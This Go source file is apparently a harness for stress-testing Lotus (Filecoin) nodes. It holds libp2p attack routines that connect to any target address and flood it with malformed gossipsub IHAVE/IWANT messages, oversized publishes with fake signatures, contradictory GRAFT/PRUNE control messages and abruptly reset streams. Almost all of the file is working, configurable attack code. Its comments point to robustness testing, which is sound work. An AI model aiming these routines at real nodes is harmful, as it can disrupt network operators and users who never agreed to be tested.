// Package resources implements network attack tools for Lotus nodes
package resources

import (
	"context"
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"time"

	"github.com/libp2p/go-libp2p"
	pubsub_pb "github.com/libp2p/go-libp2p-pubsub/pb"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/protocol"
	"github.com/libp2p/go-msgio"
	"github.com/multiformats/go-multiaddr"
)

const (
	// GossipsubID_v11 is the protocol ID for gossipsub 1.1
	GossipsubID_v11 protocol.ID = "/meshsub/1.1.0"
	// GossipsubID_v10 is the protocol ID for gossipsub 1.0
	GossipsubID_v10 protocol.ID = "/meshsub/1.0.0"
	// PubsubID is the protocol ID for legacy floodsub
	PubsubID protocol.ID = "/floodsub/1.0.0"
)

// AttackType defines different types of pubsub attacks
type AttackType int

const (
	// SendIHaveAttack sends malformed IHAVE messages
	SendIHaveAttack AttackType = iota
	// SendIWantAttack sends malformed IWANT messages
	SendIWantAttack
	// SendMixedAttack sends both IHAVE and IWANT messages
	SendMixedAttack
	// SendLargeMessagesAttack sends messages close to MaxSize to try to trigger fragmentRPC issues
	SendLargeMessagesAttack
	// SendBadControlMessagesAttack sends malformed control messages
	SendBadControlMessagesAttack
)

// PubsubAttackConfig defines parameters for pubsub attacks
type PubsubAttackConfig struct {
	TargetAddr      string
	AttackType      AttackType
	NumMessages     int
	MessageInterval time.Duration
	MessageSize     int
	Topic           string
	RandomSeed      int64
}

// RunPubsubAttack executes the pubsub attack according to the configuration
func RunPubsubAttack(config PubsubAttackConfig) error {
	rand.Seed(config.RandomSeed)
	ctx := context.Background()

	// Create a new libp2p host
	h, err := createHost(ctx)
	if err != nil {
		return fmt.Errorf("failed to create host: %w", err)
	}
	defer h.Close()

	// Parse target address
	targetMaddr, err := multiaddr.NewMultiaddr(config.TargetAddr)
	if err != nil {
		return fmt.Errorf("invalid target multiaddr: %w", err)
	}

	// Extract peer info
	targetInfo, err := peer.AddrInfoFromP2pAddr(targetMaddr)
	if err != nil {
		return fmt.Errorf("failed to extract peer info: %w", err)
	}

	// Connect to target
	if err := h.Connect(ctx, *targetInfo); err != nil {
		return fmt.Errorf("failed to connect to target: %w", err)
	}

	log.Printf("Connected to target %s", targetInfo.ID)
	log.Printf("Local node ID: %s", h.ID())
	log.Printf("Running attack type: %d", config.AttackType)

	// Sleep to allow the connection to stabilize
	time.Sleep(500 * time.Millisecond)

	// Run the appropriate attack
	switch config.AttackType {
	case SendIHaveAttack:
		return sendIHaveAttack(ctx, h, targetInfo.ID, config)
	case SendIWantAttack:
		return sendIWantAttack(ctx, h, targetInfo.ID, config)
	case SendMixedAttack:
		return sendMixedAttack(ctx, h, targetInfo.ID, config)
	case SendLargeMessagesAttack:
		return sendLargeMessagesAttack(ctx, h, targetInfo.ID, config)
	case SendBadControlMessagesAttack:
		return sendBadControlAttack(ctx, h, targetInfo.ID, config)
	default:
		return fmt.Errorf("unknown attack type: %d", config.AttackType)
	}
}

// Create a libp2p host with the necessary configuration
func createHost(ctx context.Context) (host.Host, error) {
	// Generate a key pair for this host
	priv, _, err := crypto.GenerateKeyPair(crypto.Ed25519, -1)
	if err != nil {
		return nil, fmt.Errorf("failed to generate key pair: %w", err)
	}

	// Create the host
	h, err := libp2p.New(
		libp2p.Identity(priv),
		libp2p.ListenAddrStrings("/ip4/0.0.0.0/tcp/0"),
		libp2p.ResourceManager(&network.NullResourceManager{}),
	)
	if err != nil {
		return nil, fmt.Errorf("failed to create host: %w", err)
	}

	return h, nil
}

// Generates a random message ID for pubsub
func generateRandomMessageID() string {
	id := make([]byte, 32) // Typical size for a message ID
	rand.Read(id)
	return string(id)
}

// Generates a random sequence number
func generateRandomSeqno() []byte {
	seqno := make([]byte, 8)
	binary.BigEndian.PutUint64(seqno, rand.Uint64())
	return seqno
}

// Sends IHAVE messages with random or malformed content
func sendIHaveAttack(ctx context.Context, h host.Host, targetID peer.ID, config PubsubAttackConfig) error {
	log.Printf("Starting IHAVE attack against %s", targetID)

	for i := 0; i < config.NumMessages; i++ {
		// Create a new stream for each message
		stream, err := h.NewStream(ctx, targetID, GossipsubID_v11)
		if err != nil {
			log.Printf("Failed to open stream: %v", err)
			time.Sleep(1 * time.Second)
			continue
		}

		// Generate random message IDs
		numMsgIDs := rand.Intn(100) + 1
		messageIDs := make([]string, numMsgIDs)
		for j := 0; j < numMsgIDs; j++ {
			messageIDs[j] = generateRandomMessageID()
		}

		// Create IHAVE message
		topicStr := config.Topic
		msg := &pubsub_pb.RPC{
			Control: &pubsub_pb.ControlMessage{
				Ihave: []*pubsub_pb.ControlIHave{
					{
						MessageIDs: messageIDs,
						TopicID:    &topicStr,
					},
				},
			},
		}

		// Add some padding to make the message larger if needed
		if rand.Intn(100) > 50 {
			paddingSize := rand.Intn(1024 * 8)
			padding := make([]byte, paddingSize)
			rand.Read(padding)
			// Message ID padding - add additional bogus message IDs
			extraMsgIDs := make([]string, paddingSize/32)
			for j := range extraMsgIDs {
				extraMsgIDs[j] = generateRandomMessageID()
			}
			msg.Control.Ihave[0].MessageIDs = append(msg.Control.Ihave[0].MessageIDs, extraMsgIDs...)
		}

		// Encode and write to stream
		writer := msgio.NewWriter(stream)
		msgBytes, err := msg.Marshal()
		if err != nil {
			stream.Reset()
			log.Printf("Failed to marshal message: %v", err)
			continue
		}

		if err := writer.WriteMsg(msgBytes); err != nil {
			stream.Reset()
			log.Printf("Failed to write message: %v", err)
			continue
		}

		// Sometimes don't close properly to test error handling
		if rand.Intn(100) > 80 {
			stream.Reset()
		} else {
			stream.Close()
		}

		log.Printf("Sent IHAVE message #%d with %d message IDs", i+1, len(msg.Control.Ihave[0].MessageIDs))
		time.Sleep(config.MessageInterval)
	}

	return nil
}

// Sends IWANT messages with random or malformed content
func sendIWantAttack(ctx context.Context, h host.Host, targetID peer.ID, config PubsubAttackConfig) error {
	log.Printf("Starting IWANT attack against %s", targetID)

	for i := 0; i < config.NumMessages; i++ {
		// Create a new stream for each message
		stream, err := h.NewStream(ctx, targetID, GossipsubID_v11)
		if err != nil {
			log.Printf("Failed to open stream: %v", err)
			time.Sleep(1 * time.Second)
			continue
		}

		// Generate random message IDs
		numMsgIDs := rand.Intn(100) + 1
		messageIDs := make([]string, numMsgIDs)
		for j := 0; j < numMsgIDs; j++ {
			messageIDs[j] = generateRandomMessageID()
		}

		// Create IWANT message
		msg := &pubsub_pb.RPC{
			Control: &pubsub_pb.ControlMessage{
				Iwant: []*pubsub_pb.ControlIWant{
					{
						MessageIDs: messageIDs,
					},
				},
			},
		}

		// Add some padding to make the message larger if needed
		if rand.Intn(100) > 50 {
			paddingSize := rand.Intn(1024 * 8)
			padding := make([]byte, paddingSize)
			rand.Read(padding)
			// Message ID padding - add additional bogus message IDs
			extraMsgIDs := make([]string, paddingSize/32)
			for j := range extraMsgIDs {
				extraMsgIDs[j] = generateRandomMessageID()
			}
			msg.Control.Iwant[0].MessageIDs = append(msg.Control.Iwant[0].MessageIDs, extraMsgIDs...)
		}

		// Encode and write to stream
		writer := msgio.NewWriter(stream)
		msgBytes, err := msg.Marshal()
		if err != nil {
			stream.Reset()
			log.Printf("Failed to marshal message: %v", err)
			continue
		}

		if err := writer.WriteMsg(msgBytes); err != nil {
			stream.Reset()
			log.Printf("Failed to write message: %v", err)
			continue
		}

		// Sometimes don't close properly to test error handling
		if rand.Intn(100) > 80 {
			stream.Reset()
		} else {
			stream.Close()
		}

		log.Printf("Sent IWANT message #%d with %d message IDs", i+1, len(msg.Control.Iwant[0].MessageIDs))
		time.Sleep(config.MessageInterval)
	}

	return nil
}

// Sends both IHAVE and IWANT messages
func sendMixedAttack(ctx context.Context, h host.Host, targetID peer.ID, config PubsubAttackConfig) error {
	log.Printf("Starting mixed IHAVE/IWANT attack against %s", targetID)

	for i := 0; i < config.NumMessages; i++ {
		// Alternate between IHAVE and IWANT
		if i%2 == 0 {
			if err := sendOneIHAVEMessage(ctx, h, targetID, config, i); err != nil {
				log.Printf("Error sending IHAVE message: %v", err)
			}
		} else {
			if err := sendOneIWANTMessage(ctx, h, targetID, config, i); err != nil {
				log.Printf("Error sending IWANT message: %v", err)
			}
		}

		time.Sleep(config.MessageInterval)
	}

	return nil
}

// Helper function to send a single IHAVE message
func sendOneIHAVEMessage(ctx context.Context, h host.Host, targetID peer.ID, config PubsubAttackConfig, iteration int) error {
	stream, err := h.NewStream(ctx, targetID, GossipsubID_v11)
	if err != nil {
		return fmt.Errorf("failed to open stream: %w", err)
	}
	defer stream.Close()

	// Generate random message IDs
	numMsgIDs := rand.Intn(100) + 1
	messageIDs := make([]string, numMsgIDs)
	for j := 0; j < numMsgIDs; j++ {
		messageIDs[j] = generateRandomMessageID()
	}

	// Create IHAVE message
	topicStr := config.Topic
	msg := &pubsub_pb.RPC{
		Control: &pubsub_pb.ControlMessage{
			Ihave: []*pubsub_pb.ControlIHave{
				{
					MessageIDs: messageIDs,
					TopicID:    &topicStr,
				},
			},
		},
	}

	// Encode and write to stream
	writer := msgio.NewWriter(stream)
	msgBytes, err := msg.Marshal()
	if err != nil {
		return fmt.Errorf("failed to marshal message: %w", err)
	}

	if err := writer.WriteMsg(msgBytes); err != nil {
		return fmt.Errorf("failed to write message: %w", err)
	}

	log.Printf("Sent IHAVE message #%d with %d message IDs", iteration+1, numMsgIDs)
	return nil
}

// Helper function to send a single IWANT message
func sendOneIWANTMessage(ctx context.Context, h host.Host, targetID peer.ID, config PubsubAttackConfig, iteration int) error {
	stream, err := h.NewStream(ctx, targetID, GossipsubID_v11)
	if err != nil {
		return fmt.Errorf("failed to open stream: %w", err)
	}
	defer stream.Close()

	// Generate random message IDs
	numMsgIDs := rand.Intn(100) + 1
	messageIDs := make([]string, numMsgIDs)
	for j := 0; j < numMsgIDs; j++ {
		messageIDs[j] = generateRandomMessageID()
	}

	// Create IWANT message
	msg := &pubsub_pb.RPC{
		Control: &pubsub_pb.ControlMessage{
			Iwant: []*pubsub_pb.ControlIWant{
				{
					MessageIDs: messageIDs,
				},
			},
		},
	}

	// Encode and write to stream
	writer := msgio.NewWriter(stream)
	msgBytes, err := msg.Marshal()
	if err != nil {
		return fmt.Errorf("failed to marshal message: %w", err)
	}

	if err := writer.WriteMsg(msgBytes); err != nil {
		return fmt.Errorf("failed to write message: %w", err)
	}

	log.Printf("Sent IWANT message #%d with %d message IDs", iteration+1, numMsgIDs)
	return nil
}

// Sends large pubsub messages to try to trigger fragmentRPC issues
func sendLargeMessagesAttack(ctx context.Context, h host.Host, targetID peer.ID, config PubsubAttackConfig) error {
	log.Printf("Starting large messages attack against %s", targetID)

	// The max message size is typically around 1MB, so let's create messages close to that
	halfMaxSize := config.MessageSize // Default to what was passed in config

	for i := 0; i < config.NumMessages; i++ {
		// Create a new stream for each message
		stream, err := h.NewStream(ctx, targetID, GossipsubID_v11)
		if err != nil {
			log.Printf("Failed to open stream: %v", err)
			time.Sleep(1 * time.Second)
			continue
		}

		// Create a message with payload close to half max size
		payload := make([]byte, halfMaxSize)
		rand.Read(payload)

		// Create pubsub message
		fromBytes := []byte(h.ID())
		seqno := generateRandomSeqno()
		topic := config.Topic
		subTrue := true

		pubsubMsg := &pubsub_pb.Message{
			From:      fromBytes,
			Data:      payload,
			Seqno:     seqno,
			Topic:     &topic,
			Signature: []byte("fake-signature"),
			Key:       []byte("fake-key"),
		}

		// Create RPC message
		msg := &pubsub_pb.RPC{
			Subscriptions: []*pubsub_pb.RPC_SubOpts{
				{
					Subscribe: &subTrue,
					Topicid:   &topic,
				},
			},
			Publish: []*pubsub_pb.Message{pubsubMsg},
		}

		// Encode and write to stream
		writer := msgio.NewWriter(stream)
		msgBytes, err := msg.Marshal()
		if err != nil {
			stream.Reset()
			log.Printf("Failed to marshal message: %v", err)
			continue
		}

		if err := writer.WriteMsg(msgBytes); err != nil {
			stream.Reset()
			log.Printf("Failed to write message: %v", err)
			continue
		}

		stream.Close()
		log.Printf("Sent large message #%d with payload size %d bytes", i+1, halfMaxSize)
		time.Sleep(config.MessageInterval)
	}

	return nil
}

// Sends malformed control messages
func sendBadControlAttack(ctx context.Context, h host.Host, targetID peer.ID, config PubsubAttackConfig) error {
	log.Printf("Starting bad control messages attack against %s", targetID)

	protocols := []protocol.ID{GossipsubID_v11, GossipsubID_v10, PubsubID}

	for i := 0; i < config.NumMessages; i++ {
		// Randomly choose a protocol
		protocol := protocols[rand.Intn(len(protocols))]

		// Create a new stream for each message
		stream, err := h.NewStream(ctx, targetID, protocol)
		if err != nil {
			log.Printf("Failed to open stream: %v", err)
			time.Sleep(1 * time.Second)
			continue
		}

		// Create malformed control message
		var msg *pubsub_pb.RPC
		topic := config.Topic

		switch rand.Intn(4) {
		case 0:
			// Malformed GRAFT
			msg = &pubsub_pb.RPC{
				Control: &pubsub_pb.ControlMessage{
					Graft: []*pubsub_pb.ControlGraft{
						{
							TopicID: &topic,
						},
					},
				},
			}
			log.Printf("Sending malformed GRAFT message")

		case 1:
			// Malformed PRUNE
			pruneBackoff := uint64(rand.Intn(1000))
			msg = &pubsub_pb.RPC{
				Control: &pubsub_pb.ControlMessage{
					Prune: []*pubsub_pb.ControlPrune{
						{
							TopicID: &topic,
							Backoff: &pruneBackoff,
							// Missing or random peers
						},
					},
				},
			}
			log.Printf("Sending malformed PRUNE message")

		case 2:
			// Invalid combinations of control messages
			pruneBackoff := uint64(rand.Intn(1000))
			msg = &pubsub_pb.RPC{
				Control: &pubsub_pb.ControlMessage{
					// Sending contradictory GRAFT and PRUNE for the same topic
					Graft: []*pubsub_pb.ControlGraft{
						{
							TopicID: &topic,
						},
					},
					Prune: []*pubsub_pb.ControlPrune{
						{
							TopicID: &topic,
							Backoff: &pruneBackoff,
						},
					},
					// Add IHAVE with random message IDs
					Ihave: []*pubsub_pb.ControlIHave{
						{
							TopicID:    &topic,
							MessageIDs: []string{generateRandomMessageID()},
						},
					},
				},
			}
			log.Printf("Sending contradictory control messages")

		case 3:
			// Completely invalid message
			randomBytes := make([]byte, rand.Intn(1000)+10)
			rand.Read(randomBytes)
			pubsubMsg := &pubsub_pb.Message{
				From:      []byte("invalid-peer-id"),
				Data:      make([]byte, rand.Intn(1000)+1),
				Seqno:     make([]byte, rand.Intn(20)),
				Topic:     &topic,
				Signature: make([]byte, rand.Intn(1000)+1),
				Key:       make([]byte, rand.Intn(1000)+1),
			}

			msg = &pubsub_pb.RPC{
				Publish: []*pubsub_pb.Message{pubsubMsg},
			}
			log.Printf("Sending malformed publish message")
		}

		// Encode and write to stream
		writer := msgio.NewWriter(stream)
		msgBytes, err := msg.Marshal()
		if err != nil {
			stream.Reset()
			log.Printf("Failed to marshal message: %v", err)
			continue
		}

		if err := writer.WriteMsg(msgBytes); err != nil {
			stream.Reset()
			log.Printf("Failed to write message: %v", err)
			continue
		}

		// Sometimes don't close properly to test error handling
		if rand.Intn(100) > 70 {
			stream.Reset()
		} else {
			stream.Close()
		}

		log.Printf("Sent bad control message #%d using protocol %s", i+1, protocol)
		time.Sleep(config.MessageInterval)
	}

	return nil
}
